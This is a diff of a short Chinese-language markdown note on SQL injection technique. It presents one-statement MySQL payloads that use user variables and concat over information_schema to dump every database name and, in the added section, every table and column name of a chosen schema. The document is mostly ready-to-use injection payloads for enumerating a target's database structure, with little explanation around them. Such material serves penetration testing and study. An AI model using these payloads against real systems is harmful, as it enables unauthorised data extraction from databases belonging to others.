@@ -2,7 +2,7 @@
 
 先说结论（个人理解）：不是什么新的SQL注入漏洞利用方式，只是一种“在一条语句中提取全部数据的方便的”提取方式
 
-一次性返回所有数据库的名称：  
+# 获取所有数据库名：  
 ```
 (select (@a) from (select(@a:=0x00),(select (@a) from (information_schema.schemata) where (@a) in (@a:=concat(@a,schema_name,'<br>'))))a);
 ```
@@ -40,3 +40,9 @@
 ```
 的值如下  
 ![image](./2.png)  
+
+# 获取指定数据库的全部表名和字段名
+```
+(select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(table_schema='anyisec')and(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a);
+```
+![image](./3.png)  
